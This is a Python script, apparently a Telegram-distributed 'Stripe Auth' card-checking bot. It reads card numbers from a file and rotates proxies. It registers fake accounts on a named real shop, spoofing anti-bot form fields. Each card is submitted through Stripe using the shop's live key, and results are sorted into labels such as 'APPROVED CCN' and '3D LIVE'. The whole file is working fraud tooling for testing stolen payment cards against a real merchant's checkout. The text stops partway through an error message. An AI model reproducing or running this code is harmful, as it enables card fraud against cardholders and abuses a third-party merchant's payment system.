import requests
import os
import re
import random
import string
import time
import json
import uuid
from user_agent import generate_user_agent
import urllib3
from datetime import datetime
from typing import Dict, Tuple, Optional, List
import threading
from urllib3.exceptions import InsecureRequestWarning
from urllib3 import disable_warnings

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
disable_warnings(InsecureRequestWarning)

stripe_headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.6',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="142", "Brave";v="142", "Not_A Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
}

# Configuration from autostripe-api.py
BASE_URL = "https://iconichairproducts.com"
STRIPE_KEY = "pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs"

def get_rotating_user_agent():
    agents = [
        generate_user_agent(device_type='desktop'),
        generate_user_agent(device_type='desktop', os=('mac', 'linux')),
        generate_user_agent(device_type='desktop', os=('win',)),
        generate_user_agent(navigator='chrome'),
        generate_user_agent(navigator='firefox'),
    ]
    return random.choice(agents)

def generate_random_email():
    timestamp = int(time.time() * 1000)
    random_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    unique_id = str(uuid.uuid4())[:8]
    return f'{random_part}_{unique_id}_{timestamp}@outlook.com'

def parse_proxy(proxy_str):
    try:
        proxy_str = proxy_str.strip()
        
        if '@' in proxy_str:
            auth_part, server_part = proxy_str.split('@', 1)
            username, password = auth_part.split(':', 1)
            ip, port = server_part.split(':', 1)
        else:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                ip, port, username, password = parts
            elif len(parts) == 2:
                ip, port = parts
                username, password = None, None
            else:
                ip, port = parts[0], parts[1]
                username, password = None, None
        
        if username and password:
            proxy_url = f'http://{username}:{password}@{ip}:{port}'
        else:
            proxy_url = f'http://{ip}:{port}'
        
        return {'http': proxy_url, 'https': proxy_url}
    except:
        return None

def load_proxies():
    if os.path.exists('proxy.txt'):
        with open('proxy.txt', 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    return []

def load_cards():
    if os.path.exists('cards.txt'):
        with open('cards.txt', 'r') as f:
            cards = [line.strip() for line in f if line.strip()]
        return cards
    return []

def get_bin_info(bin_number):
    if not bin_number or len(bin_number) < 6:
        return {
            'bank': 'Unavailable',
            'country': 'Unknown',
            'brand': 'Unknown',
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': ''
        }
    
    bin_code = bin_number[:6]
    
    # Try antipublic first
    result = get_bin_info_from_antipublic(bin_code)
    if result['country'] != 'Unknown' and result['bank'] != 'Unknown':
        return {
            'bank': result['bank'],
            'country': result['country'],
            'brand': result['scheme'],
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': get_country_emoji_from_name(result['country'])
        }
    
    # Try bincheck
    result = get_bin_info_from_bincheck(bin_code)
    if result['country'] != 'Unknown' and result['bank'] != 'Unknown':
        return {
            'bank': result['bank'],
            'country': result['country'],
            'brand': result['scheme'],
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': get_country_emoji_from_name(result['country'])
        }
    
    # Try binlist as fallback
    result = get_bin_info_from_binlist(bin_code)
    return {
        'bank': result.get('bank', 'Unavailable'),
        'country': result.get('country', 'Unknown'),
        'brand': result.get('scheme', 'Unknown'),
        'type': 'Unknown',
        'level': 'Unknown',
        'emoji': get_country_emoji_from_name(result.get('country', 'Unknown'))
    }

def get_bin_info_from_binlist(bin):
    """Get BIN info from binlist.net"""
    headers = {
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'
    }
    
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin}", headers=headers, timeout=5, verify=False)
        if response.status_code != 200:
            return {'country': 'Unknown', 'bank': 'Unknown', 'scheme': 'Unknown'}
        
        data = response.json()
        scheme = data.get('scheme', 'Unknown')
        bank = data.get('bank', {}).get('name', 'Unknown')
        country = data.get('country', {}).get('name', 'Unknown')
        
        return {
            'scheme': format_scheme(scheme),
            'bank': bank,
            'country': country
        }
        
    except:
        return {'scheme': 'Unknown', 'country': 'Unknown', 'bank': 'Unknown'}

def get_bin_info_from_bincheck(bin):
    """Get BIN info from bincheck.io"""
    headers = {
        'Referer': f'https://bincheck.io/details/{bin}',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v"138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    
    try:
        response = requests.get(f"https://bincheck.io/details/{bin}", headers=headers, timeout=5, verify=False)
        if response.status_code != 200:
            return {'scheme': 'Unknown', 'country': 'Unknown', 'bank': 'Unknown'}
        
        html = response.text
        
        # Extract scheme
        scheme_match = re.search(r'<td[^>]*>Card Brand</td>\s*<td[^>]*>([^<]+)</td>', html, re.IGNORECASE)
        scheme = scheme_match.group(1) if scheme_match else 'Unknown'
        
        # Extract bank
        bank_match = re.search(r'<td[^>]*>Bank</td>\s*<td[^>]*>([^<]+)</td>', html, re.IGNORECASE)
        bank = bank_match.group(1) if bank_match else 'Unknown'
        
        # Extract country
        country_match = re.search(r'<td[^>]*>Country</td>\s*<td[^>]*>([^<]+)</td>', html, re.IGNORECASE)
        country = country_match.group(1) if country_match else 'Unknown'
        
        return {
            'scheme': format_scheme(scheme),
            'bank': bank.strip(),
            'country': country.strip()
        }
        
    except:
        return {'scheme': 'Unknown', 'country': 'Unknown', 'bank': 'Unknown'}

def get_bin_info_from_antipublic(bin):
    """Get BIN info from antipublic.cc"""
    headers = {
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'
    }
    
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin}", headers=headers, timeout=5, verify=False)
        if response.status_code != 200:
            return {'scheme': 'Unknown', 'country': 'Unknown', 'bank': 'Unknown'}
        
        data = response.json()
        
        scheme = data.get('brand', 'Unknown')
        bank = data.get('bank', 'Unknown')
        country = data.get('country_name', 'Unknown')
        
        return {
            'scheme': format_scheme(scheme),
            'bank': bank,
            'country': country
        }
        
    except:
        return {'scheme': 'Unknown', 'country': 'Unknown', 'bank': 'Unknown'}

def format_scheme(scheme):
    """Format card scheme name"""
    scheme = scheme.lower().strip()
    
    mapping = {
        'visa': 'VISA',
        'mastercard': 'MasterCard',
        'mc': 'MasterCard',
        'master card': 'MasterCard',
        'amex': 'American Express',
        'american express': 'American Express',
        'americanexpress': 'American Express',
        'discover': 'Discover',
        'jcb': 'JCB',
        'diners': 'Diners Club',
        'diners club': 'Diners Club',
        'unionpay': 'UnionPay',
        'union pay': 'UnionPay',
        'maestro': 'Maestro',
        'elo': 'Elo',
        'hiper': 'Hiper',
        'hipercard': 'Hipercard'
    }
    
    return mapping.get(scheme, scheme.capitalize())

def get_country_emoji(country_code):
    if not country_code or len(country_code) != 2:
        return ''
    try:
        country_code = country_code.upper()
        return ''.join(chr(127397 + ord(char)) for char in country_code)
    except:
        return ''

def get_country_emoji_from_name(country_name):
    # Simple mapping for common countries - you can expand this
    country_map = {
        'United States': 'US',
        'United Kingdom': 'GB',
        'Canada': 'CA',
        'Australia': 'AU',
        'Germany': 'DE',
        'France': 'FR',
        'Italy': 'IT',
        'Spain': 'ES',
        'Netherlands': 'NL',
        'Belgium': 'BE',
        'Switzerland': 'CH',
        'Austria': 'AT',
        'Sweden': 'SE',
        'Norway': 'NO',
        'Denmark': 'DK',
        'Finland': 'FI',
        'Poland': 'PL',
        'Portugal': 'PT',
        'Greece': 'GR',
        'Ireland': 'IE',
        'New Zealand': 'NZ',
        'Japan': 'JP',
        'South Korea': 'KR',
        'China': 'CN',
        'India': 'IN',
        'Brazil': 'BR',
        'Mexico': 'MX',
        'Argentina': 'AR',
        'Chile': 'CL',
        'Colombia': 'CO',
    }
    
    code = country_map.get(country_name, '')
    if code:
        return get_country_emoji(code)
    return ''

def initialize_cookies(session, proxy_str):
    """Initialize cookies by visiting the my-account page"""
    try:
        proxies = parse_proxy(proxy_str) if proxy_str else None
        response = session.get(
            f"{BASE_URL}/my-account/", 
            timeout=30, 
            verify=False,
            allow_redirects=True,
            proxies=proxies
        )
        response.raise_for_status()
        return True
    except Exception as e:
        return False

def extract_register_nonce(html_content):
    """Extract woocommerce-register-nonce from HTML"""
    pattern = r'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="([a-f0-9]+)"'
    match = re.search(pattern, html_content)
    return match.group(1) if match else None

def extract_wp_referer(html_content):
    """Extract _wp_http_referer from HTML"""
    pattern = r'name="_wp_http_referer" value="([^"]+)"'
    match = re.search(pattern, html_content)
    return match.group(1) if match else "/my-account/"

def is_logged_in(html_content):
    """Check if registration was successful by looking for MyAccount navigation"""
    patterns = [
        r'woocommerce-MyAccount-navigation-link--dashboard',
        r'woocommerce-MyAccount-navigation-link--orders',
        r'woocommerce-MyAccount-navigation-link--payment-methods'
    ]
    return any(re.search(pattern, html_content) for pattern in patterns)

def get_random_email():
    """Generate a random email"""
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
    domain = random.choice(domains)
    return f"{username}@{domain}"

def register_account(session, proxy_str):
    """Register a new account"""
    try:
        proxies = parse_proxy(proxy_str) if proxy_str else None
        
        # Initialize cookies if needed
        if not initialize_cookies(session, proxy_str):
            return False, "Failed to initialize cookies"
        
        # Generate random credentials
        email = get_random_email()
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        
        # Step 1: Get the registration page to extract nonce
        response = session.get(
            f"{BASE_URL}/my-account/", 
            timeout=30, 
            verify=False,
            proxies=proxies
        )
        response.raise_for_status()
        
        # Extract nonce and referer
        nonce = extract_register_nonce(response.text)
        wp_referer = extract_wp_referer(response.text)
        
        if not nonce:
            return False, "Failed to extract nonce"
        
        # Step 2: Register the account
        registration_data = {
            'email': email,
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': 'https://iconichairproducts.com/my-account/payment-methods/',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://iconichairproducts.com/my-account/add-payment-method/',
            'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'wc_order_attribution_session_pages': '5',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'woocommerce-register-nonce': nonce,
            '_wp_http_referer': wp_referer,
            'register': 'Register',
        }
        
        # Add additional form fields
        timestamp = int(time.time() * 1000)
        registration_data.update({
            'ak_bib': str(timestamp),
            'ak_bfs': str(timestamp + 6202),
            'ak_bkpc': '1',
            'ak_bkp': '3;',
            'ak_bmc': '3;3,7226;',
            'ak_bmcc': '2',
            'ak_bmk': '',
            'ak_bck': '',
            'ak_bmmc': '1',
            'ak_btmc': '2',
            'ak_bsc': '3',
            'ak_bte': '283;67,282;203,1497;22,5504;',
            'ak_btec': '4',
            'ak_bmm': '15,335;',
        })
        
        response = session.post(
            f"{BASE_URL}/my-account/",
            data=registration_data,
            timeout=30,
            verify=False,
            allow_redirects=True,
            proxies=proxies
        )
        response.raise_for_status()
        
        # Check if registration was successful
        if is_logged_in(response.text):
            return True, "Account created"
        else:
            return False, "Registration failed - not logged in"
            
    except Exception as e:
        return False, f"Account error: {str(e)}"

def extract_nonce_multiple_methods(html_content):
    """Extract nonce using multiple methods"""
    methods = [
        _extract_via_direct_pattern,
        _extract_via_stripe_params,
        _extract_via_json_script,
        _extract_via_fallback_pattern
    ]
    
    for method in methods:
        nonce = method(html_content)
        if nonce:
            return nonce
    return None

def _extract_via_direct_pattern(html):
    pattern = r'"createAndConfirmSetupIntentNonce":"([a-f0-9]{10})"'
    match = re.search(pattern, html)
    return match.group(1) if match else None

def _extract_via_stripe_params(html):
    pattern = r'var\s+wc_stripe_params\s*=\s*({[^}]+})'
    match = re.search(pattern, html)
    if match:
        try:
            json_str = match.group(1)
            json_str = re.sub(r',\s*}', '}', json_str)
            data = json.loads(json_str)
            return data.get('createAndConfirmSetupIntentNonce')
        except:
            pass
    return None

def _extract_via_json_script(html):
    script_pattern = r'<script[^>]*>(.*?)</script>'
    scripts = re.findall(script_pattern, html, re.DOTALL)
    
    for script in scripts:
        if 'createAndConfirmSetupIntentNonce' in script:
            json_pattern = r'\{[^}]*(?:createAndConfirmSetupIntentNonce[^}]*)+[^}]*\}'
            json_matches = re.findall(json_pattern, script)
            for json_str in json_matches:
                try:
                    clean_json = json_str.replace("'", '"')
                    data = json.loads(clean_json)
                    if 'createAndConfirmSetupIntentNonce' in data:
                        return data['createAndConfirmSetupIntentNonce']
                except:
                    continue
    return None

def _extract_via_fallback_pattern(html):
    patterns = [
        r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([a-f0-9]{10})["\']',
        r'createAndConfirmSetupIntentNonce\s*=\s*["\']([a-f0-9]{10})["\']',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, html, re.IGNORECASE)
        if match:
            return match.group(1)
    return None

def get_payment_nonce(session, proxy_str):
    """Get AJAX nonce from add-payment-method page"""
    try:
        proxies = parse_proxy(proxy_str) if proxy_str else None
        
        response = session.get(
            f"{BASE_URL}/my-account/add-payment-method/",
            timeout=30,
            verify=False,
            proxies=proxies
        )
        response.raise_for_status()
        
        nonce = extract_nonce_multiple_methods(response.text)
        if nonce:
            return nonce, "Success"
        else:
            return None, "Failed to extract nonce"
                
    except Exception as e:
        return None, f"Payment nonce error: {str(e)}"

def categorize_response(response_text):
    """Categorize Stripe response"""
    response = response_text.lower()
    
    approved_keywords = [
        "succeeded", "payment-success", "successfully", "thank you for your support",
        "your card does not support this type of purchase", "thank you",
        "membership confirmation", "/wishlist-member/?reg=", "thank you for your payment",
        "thank you for membership", "payment received", "your order has been received",
        "purchase successful", "approved"
    ]
    
    insufficient_keywords = [
        "insufficient funds", "insufficient_funds", "payment-successfully"
    ]
    
    auth_keywords = [
        "mutation_ok_result", "requires_action"
    ]

    ccn_cvv_keywords = [
        "incorrect_cvc", "invalid cvc", "invalid_cvc", "incorrect cvc", "incorrect cvv",
        "incorrect_cvv", "invalid_cvv", "invalid cvv", ' "cvv_check": "pass" ',
        "cvv_check: pass", "security code is invalid", "security code is incorrect",
        "zip code is incorrect", "zip code is invalid", "card is declined by your bank",
        "lost_card", "stolen_card", "transaction_not_allowed", "pickup_card"
    ]

    live_keywords = [
        "authentication required", "three_d_secure", "3d secure", "stripe_3ds2_fingerprint"
    ]
    
    declined_keywords = [
        "declined", "invalid", "failed", "error", "incorrect"
    ]

    if any(kw in response for kw in approved_keywords):
        return "APPROVED", "🔥"
    elif any(kw in response for kw in ccn_cvv_keywords):
        return "CCN/CVV", "✅"
    elif any(kw in response for kw in live_keywords):
        return "3D LIVE", "✅"
    elif any(kw in response for kw in insufficient_keywords):
        return "INSUFFICIENT FUNDS", "💰"
    elif any(kw in response for kw in auth_keywords):
        return "STRIPE AUTH", "✅️"
    elif any(kw in response for kw in declined_keywords):
        return "DECLINED", "❌"
    else:
        return "UNKNOWN", "❓"

def check_card_stripe(cc_line):
    start_time = time.time()
    max_retries = 2
    
    for attempt in range(max_retries):
        try:
            n, mm, yy, cvc = cc_line.strip().split('|')
            if not yy.startswith('20'):
                yy = '20' + yy
            
            bin_info = get_bin_info(n[:6])
            
            session = requests.Session()
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
            })

            if len(yy) == 4:
                yy_stripe = yy[-2:]
            else:
                yy_stripe = yy

            proxies_list = load_proxies()
            if not proxies_list:
                proxy_str = None
            else:
                proxy_str = random.choice(proxies_list)
            
            account_created, account_msg = register_account(session, proxy_str)
            if not account_created:
                elapsed_time = time.time() - start_time
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Account creation failed
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

            ajax_nonce, nonce_msg = get_payment_nonce(session, proxy_str)
            if not ajax_nonce:
                elapsed_time = time.time() - start_time
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Payment nonce failed
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

            # First request - Stripe API to create payment method
            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }

            # Prepare Stripe data
            data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2Fdda83de495%3B+stripe-js-v3%2Fdda83de495%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ficonichairproducts.com&time_on_page=22151&guid=59935264-a0ad-467b-8c25-e05e6e3941cb5cb1d3&muid=efadee54-caa2-4cbe-abfb-304d69bc865c187523&sid=b8c63ed0-7922-46ba-83f7-2260590ce31aa73df1&key={STRIPE_KEY}&_stripe_account=acct_1JmxDb2Hh2LP7rQY'

            proxies = parse_proxy(proxy_str) if proxy_str else None
            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30, proxies=proxies, verify=False)
            
            if response.status_code != 200:
                elapsed_time = time.time() - start_time
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Stripe API error
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            stripe_response = response.json()
            
            if 'id' not in stripe_response:
                error_msg = stripe_response.get('error', {}).get('message', 'Unknown error')
                elapsed_time = time.time() - start_time
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            pid = stripe_response["id"]
            
            # Second request - Create setup intent
            headers2 = {
                'authority': 'iconichairproducts.com',
                'accept': '*/*',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'origin': 'https://iconichairproducts.com',
                'referer': 'https://iconichairproducts.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }

            form_data = {
                'action': 'create_setup_intent',
                'wcpay-payment-method': pid,
                '_ajax_nonce': ajax_nonce
            }

            response2 = session.post(
                'https://iconichairproducts.com/wp-admin/admin-ajax.php',
                headers=headers2,
                data=form_data,
                timeout=30,
                verify=False,
                proxies=proxies
            )
            
            if response2.status_code != 200:
                elapsed_time = time.time() - start_time
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ AJAX request failed
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            try:
                pix = response2.json()
                
                if pix.get('success'):
                    elapsed_time = time.time() - start_time
                    return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Payment method successfully added. | CVC_CHECK : PASS[M] ✅
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                else:
                    error_msg = pix.get('data', {}).get('error', {}).get('message', 'Unknown error')
                    category, emoji = categorize_response(error_msg)
                    elapsed_time = time.time() - start_time
                    
                    # Check if it's a CCN/CVV case
                    if category == "CCN/CVV":
                        return f"""
APPROVED CCN ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                    elif category in ["3D LIVE", "STRIPE AUTH"]:
                        return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                    else:
                        return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                    
            except json.JSONDecodeError:
                elapsed_time = time.time() - start_time
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Invalid response
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.HTTPError):
            if attempt < max_retries - 1:
                time.sleep(0.5)
                continue
            else:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Network error after {max_retries} retries
